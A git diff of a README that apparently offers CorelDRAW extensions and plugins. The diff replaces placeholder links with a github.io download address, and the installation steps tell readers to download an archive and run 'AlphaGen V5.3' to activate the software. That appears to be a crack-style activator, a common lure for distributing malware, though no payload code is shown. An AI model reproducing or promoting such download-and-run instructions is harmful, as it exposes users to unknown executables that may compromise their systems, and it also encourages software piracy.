@@ -2,13 +2,13 @@
 
 Expand the functionality of CorelDRAW with powerful extensions and plugins — from productivity tools to creative effects and export modules.
 
-[![Download](https://img.shields.io/badge/Download-CorelDRAW_Extensions-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-CorelDRAW_Extensions-blueviolet)](https://coreldraw-extensions-plugins-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://coreldraw-extensions-plugins-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate plugin and extension support  
 4. ✅ In CorelDRAW, go to `Tools > Options > Workspace > Plug-ins` and add your extension folder
